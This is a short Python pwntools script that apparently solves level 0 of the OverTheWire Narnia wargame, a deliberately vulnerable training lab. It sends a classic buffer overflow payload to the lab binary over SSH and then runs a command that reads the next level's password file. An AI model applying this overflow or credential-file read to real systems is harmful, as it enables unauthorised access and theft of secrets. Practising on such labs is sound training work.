from pwn import *


con = ssh('narnia0', 'narnia.labs.overthewire.org', password='narnia0', port=2226)
p = con.process('/narnia/narnia0')
print(p.recv())
# Classic buffer overflow
payload = b'A' * 20 + p32(0xdeadbeef)
p.sendline(payload)
p.recv()
p.sendline('cat /etc/narnia_pass/narnia1')
print(p.recvline())
